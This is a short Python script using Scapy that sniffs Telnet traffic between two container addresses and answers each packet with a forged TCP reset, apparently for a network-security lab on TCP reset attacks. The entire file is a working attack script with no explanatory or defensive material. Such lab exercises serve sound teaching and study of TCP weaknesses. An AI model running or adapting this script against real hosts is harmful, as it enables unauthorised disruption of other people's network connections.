#!/usr/bin/python3
from scapy.all import *

SRC  = "172.17.0.3"
DST  = "172.17.0.2"
PORT = 23

def spoof(pkt):
    old_tcp = pkt[TCP]
    old_ip  = pkt[IP]

    #############################################
    ip  =  IP( src   = old_ip.dst , 
               dst   = old_ip.src
             )
    tcp = TCP( sport = old_tcp.dport , 
               dport = old_tcp.sport , 
               seq   = pkt.ack ,
               flags = "R"
             ) 
    #############################################

    pkt = ip/tcp
    send(pkt,verbose=0)
    print("Spoofed Packet: {} --> {}".format(ip.src, ip.dst))

f = 'tcp and src host {} and dst host {} and dst port {}'.format(SRC, DST, PORT)
sniff(iface="docker0",filter=f, prn=spoof)

